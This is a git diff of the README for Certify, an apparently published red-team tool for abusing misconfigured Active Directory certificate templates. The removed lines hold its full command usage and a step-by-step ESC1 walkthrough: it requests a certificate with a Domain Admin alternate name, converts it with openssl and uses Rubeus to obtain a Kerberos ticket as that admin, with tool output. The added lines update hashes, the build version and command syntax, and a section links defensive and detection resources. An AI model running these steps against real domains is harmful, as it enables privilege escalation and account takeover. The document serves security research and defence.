@@ -7,8 +7,6 @@ Certify is a C# tool to enumerate and abuse misconfigurations in Active Director
 ## Table of Contents
 - [Certify](#certify)
   - [Usage](#usage)
-    - [Using Requested Certificates](#using-requested-certificates)
-  - [Example Walkthrough](#example-walkthrough)
   - [Defensive Considerations](#defensive-considerations)
   - [Compile Instructions](#compile-instructions)
     - [Sidenote: Running Certify Through PowerShell](#sidenote-running-certify-through-powershell)
@@ -19,324 +17,20 @@ Certify is a C# tool to enumerate and abuse misconfigurations in Active Director
 
 ## Usage
 
-    C:\Tools>Certify.exe
-
-       _____          _   _  __
-      / ____|        | | (_)/ _|
-     | |     ___ _ __| |_ _| |_ _   _
-     | |    / _ \ '__| __| |  _| | | |
-     | |___|  __/ |  | |_| | | | |_| |
-      \_____\___|_|   \__|_|_|  \__, |
-                                 __/ |
-                                |___./
-      v1.0.0
-
-
-      Find information about all registered CAs:
-
-        Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
-
-
-      Find all enabled certificate templates:
-
-        Certify.exe find [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
-
-      Find vulnerable/abusable certificate templates using default low-privileged groups:
-
-        Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
-
-      Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
-
-        Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
-
-      Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:
-
-        Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
-
-      Find enabled certificate templates capable of client authentication:
-
-        Certify.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
-
-      Find all enabled certificate templates, display all of their permissions, and don't display the banner message:
-
-        Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]
-
-      Find all enabled certificate templates and output to a json file:
-
-        Certify.exe find /json /outfile:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]
-
-
-      Enumerate access control information for PKI objects:
-
-        Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]
-
-
-      Request a new certificate using the current user context:
-
-        Certify.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
-
-      Request a new certificate using the current machine context:
-
-        Certify.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]
-
-      Request a new certificate using the current user context but for an alternate name (if supported):
-
-        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER
-
-      Request a new certificate using the current user context but for an alternate name and SID (if supported):
-
-        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER /sid:S-1-5-21-2697957641-2271029196-387917394-2136
-
-      Request a new certificate using the current user context but for an alternate name and URL (if supported):
-
-        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-2136
-
-      Request a new certificate on behalf of another user, using an enrollment agent certificate:
-
-        Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
-
-
-      Download an already requested certificate:
-
-        Certify.exe download /ca:SERVER\ca-name /id:X [/install] [/machine]
-
-
-
-    Certify completed in 00:00:00.0200190
-
-
-### Using Requested Certificates
-
-Certificates can be transformed to .pfx's usable with Certify with:
-
-    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-
-Certificates can be used with Rubeus to request a TGT with:
-
-    Rubeus.exe asktgt /user:X /certificate:C:\Temp\cert.pfx /password:<CERT_PASSWORD>
-
-
-## Example Walkthrough
-
-First, use Certify.exe to see if there are any vulnerable templates:
-
-    C:\Temp>Certify.exe find /vulnerable
-       _____          _   _  __
-      / ____|        | | (_)/ _|
-     | |     ___ _ __| |_ _| |_ _   _
-     | |    / _ \ '__| __| |  _| | | |
-     | |___|  __/ |  | |_| | | | |_| |
-      \_____\___|_|   \__|_|_|  \__, |
-                                 __/ |
-                                |___./
-      v1.0.0
-
-    [*] Action: Find certificate templates
-    [*] Using the search base 'CN=Configuration,DC=theshire,DC=local'
-    [*] Restricting to CA name : dc.theshire.local\theshire-DC-CA
-
-    [*] Listing info about the Enterprise CA 'theshire-DC-CA'
-
-        Enterprise CA Name            : theshire-DC-CA
-        DNS Hostname                  : dc.theshire.local
-        FullName                      : dc.theshire.local\theshire-DC-CA
-        Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
-        Cert SubjectName              : CN=theshire-DC-CA, DC=theshire, DC=local
-        Cert Thumbprint               : 187D81530E1ADBB6B8B9B961EAADC1F597E6D6A2
-        Cert Serial                   : 14BFC25F2B6EEDA94404D5A5B0F33E21
-        Cert Start Date               : 1/4/2021 10:48:02 AM
-        Cert End Date                 : 1/4/2026 10:58:02 AM
-        Cert Chain                    : CN=theshire-DC-CA,DC=theshire,DC=local
-        UserSpecifiedSAN              : Disabled
-        CA Permissions                :
-          Owner: BUILTIN\Administrators        S-1-5-32-544
-
-          Access Rights                                     Principal
-
-          Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
-          Allow  ManageCA, ManageCertificates               THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-          Allow  ManageCA, Read, Enroll                     THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-            [!] Low-privileged principal has ManageCA rights!
-          Allow  Enroll                                     THESHIRE\Domain Computers     S-1-5-21-937929760-3187473010-80948926-515
-          Allow  ManageCA, ManageCertificates               THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-          Allow  ManageCertificates, Enroll                 THESHIRE\certmanager          S-1-5-21-937929760-3187473010-80948926-1605
-          Allow  ManageCA, Enroll                           THESHIRE\certadmin            S-1-5-21-937929760-3187473010-80948926-1606
-        Enrollment Agent Restrictions :
-          Everyone                      S-1-1-0
-            Template : <All>
-            Targets  :
-              Everyone                  S-1-1-0
-
-          Everyone                      S-1-1-0
-            Template : User
-            Targets  :
-              Everyone                  S-1-1-0
-
-    Vulnerable Certificates Templates :
-
-        CA Name                         : dc.theshire.local\theshire-DC-CA
-        Template Name                   : User2
-        Validity Period                 : 2 years
-        Renewal Period                  : 6 weeks
-        msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
-        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT
-        Authorized Signatures Required  : 0
-        pkiextendedkeyusage             : Client Authentication, Smart Card Logon
-        Permissions
-          Enrollment Permissions
-            Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-            All Extended Rights         : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-          Object Control Permissions
-            Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
-            Full Control Principals     : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-            WriteOwner Principals       : NT AUTHORITY\Authenticated UsersS-1-5-11
-                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-            WriteDacl Principals        : NT AUTHORITY\Authenticated UsersS-1-5-11
-                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-            WriteProperty Principals    : NT AUTHORITY\Authenticated UsersS-1-5-11
-                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-
-        CA Name                         : dc.theshire.local\theshire-DC-CA
-        Template Name                   : VulnTemplate
-        Validity Period                 : 3 years
-        Renewal Period                  : 6 weeks
-        msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
-        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
-        Authorized Signatures Required  : 0
-        pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email
-        Permissions
-          Enrollment Permissions
-            Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-          Object Control Permissions
-            Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
-            WriteOwner Principals       : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
-            WriteDacl Principals        : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
-            WriteProperty Principals    : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
-                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
-                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
-
-
-
-    Certify completed in 00:00:00.6548319
-
-Given the above results, we have the three following issues:
-
-1. `THESHIRE\Domain Users` have **ManageCA** permissions over the `dc.theshire.local\theshire-DC-CA` CA (ESC7)
-   * This means that the EDITF_ATTRIBUTESUBJECTALTNAME2 flag can be flipped on the CA by anyone.
-2. `THESHIRE\Domain Users` have full control over the **User2** template (ESC4)
-   * This means that anyone can flip the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag on this template and remove the **PEND_ALL_REQUESTS** issuance requirement.
-3. `THESHIRE\Domain Users` can enroll in the **VulnTemplate** template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1)
-   * This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).
-
-We'll show the abuse of scenario 3.
-
-Next, let's request a new certificate for this template/CA, specifying a DA `localadmin` as the alternate principal:
-
-    C:\Temp>Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
-
-       _____          _   _  __
-      / ____|        | | (_)/ _|
-     | |     ___ _ __| |_ _| |_ _   _
-     | |    / _ \ '__| __| |  _| | | |
-     | |___|  __/ |  | |_| | | | |_| |
-      \_____\___|_|   \__|_|_|  \__, |
-                                 __/ |
-                                |___./
-      v1.0.0
-
-    [*] Action: Request a Certificates
-
-    [*] Current user context    : THESHIRE\harmj0y
-    [*] No subject name specified, using current context as subject.
-
-    [*] Template                : VulnTemplate
-    [*] Subject                 : CN=harmj0y, OU=TestOU, DC=theshire, DC=local
-    [*] AltName                 : localadmin
-
-    [*] Certificate Authority   : dc.theshire.local\theshire-DC-CA
-
-    [*] CA Response             : The certificate had been issued.
-    [*] Request ID              : 337
-
-    [*] cert.pem         :
-
-    -----BEGIN RSA PRIVATE KEY-----
-    MIIEpAIBAAKCAQEAn8bKuwCYj8...
-    -----END RSA PRIVATE KEY-----
-    -----BEGIN CERTIFICATE-----
-    MIIGITCCBQmgAwIBAgITVQAAAV...
-    -----END CERTIFICATE-----
-
-
-    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-
-
-
-    Certify completed in 00:00:04.2127911
-
-
-Copy the ` -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` section to a file on Linux/macOS, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:
-
-    (base) laptop:~ harmj0y$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-    Enter Export Password:
-    Verifying - Enter Export Password:
-    (base) laptop:~ harmj0y$
-
-
-Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:
-
-    C:\Temp>Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx
-
-       ______        _
-      (_____ \      | |
-       _____) )_   _| |__  _____ _   _  ___
-      |  __  /| | | |  _ \| ___ | | | |/___)
-      | |  \ \| |_| | |_) ) ____| |_| |___ |
-      |_|   |_|____/|____/|_____)____/(___/
-
-      v1.6.1
-
-    [*] Action: Ask TGT
-
-    [*] Using PKINIT with etype rc4_hmac and subject: CN=harmj0y, OU=TestOU, DC=theshire, DC=local
-    [*] Building AS-REQ (w/ PKINIT preauth) for: 'theshire.local\localadmin'
-    [+] TGT request successful!
-    [*] base64(ticket.kirbi):
-
-          doIFujCCBbagAwIBBaEDAgEWooIExzCC...(snip)...
-
-      ServiceName           :  krbtgt/theshire.local
-      ServiceRealm          :  THESHIRE.LOCAL
-      UserName              :  localadmin
-      UserRealm             :  THESHIRE.LOCAL
-      StartTime             :  2/22/2021 2:06:51 PM
-      EndTime               :  2/22/2021 3:06:51 PM
-      RenewTill             :  3/1/2021 2:06:51 PM
-      Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
-      KeyType               :  rc4_hmac
-      Base64(key)           :  Etb5WPFWeMbsZr2+FQQQMw==
-
+A command overview and comprehensive usage details can be found on the [wiki](https://github.com/GhostPack/Certify/wiki).
 
 ## Defensive Considerations
 
 Certify was released at Black Hat 2021 with our ["Certified Pre-Owned: Abusing Active Directory Certificate Services"](https://www.blackhat.com/us-21/briefings/schedule/#certified-pre-owned-abusing-active-directory-certificate-services-23168) talk.
 
-The [TypeRefHash](https://www.gdatasoftware.com/blog/2020/06/36164-introducing-the-typerefhash-trh) of the current Certify codebase is **f9dbbfe2527e1164319350c0b0900c58be57a46c53ffef31699ed116a765995a**.
+The [TypeRefHash](https://www.gdatasoftware.com/blog/2020/06/36164-introducing-the-typerefhash-trh) of the current Certify codebase is:
+```
+015430f861aaeabd8ede11f450ab472b345883a5b0f5c5d0f92ab8839686db15
+```
 
-The TypeLib GUID of Certify is **64524ca5-e4d0-41b3-acc3-3bdbefd40c97**. This is reflected in the Yara rules currently in this repo.
+The TypeLib GUID of Certify is `15cfadd8-5f6c-424b-81dc-c028312d025f`.
+
+This is reflected in the Yara rules currently in this repo.
 
 See our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) for prevention and detection guidance.
 
@@ -345,7 +39,7 @@ See our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.
 
 We are not planning on releasing binaries for Certify, so you will have to compile yourself :)
 
-Certify has been built against .NET 4.0 and is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose "Release", and build.
+Certify has been built against .NET 4.7.2 and is compatible with [Visual Studio 2022 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose "Release", and build.
 
 
 ### Sidenote: Running Certify Through PowerShell
@@ -360,7 +54,7 @@ Certify can then be loaded in a PowerShell script with the following (where "aa.
 
 The Main() method and any arguments can then be invoked as follows:
 
-    [Certify.Program]::Main("find /vulnerable".Split())
+    [Certify.Program]::Main("enum-templates --filter-enabled --filter-vulnerable".Split())
 
 
 #### Sidenote Sidenote: Running Certify Over PSRemoting
@@ -369,7 +63,7 @@ Due to the way PSRemoting handles output, we need to redirect stdout to a string
 
 If you follow the instructions in [Sidenote: Running Certify Through PowerShell](#sidenote-running-Certify-through-powershell) to create a Certify.ps1, append something like the following to the script:
 
-    [Certify.Program]::MainString("find /vulnerable")
+    [Certify.Program]::MainString("enum-templates --filter-enabled --filter-vulnerable")
 
 You should then be able to run Certify over PSRemoting with something like the following:
 
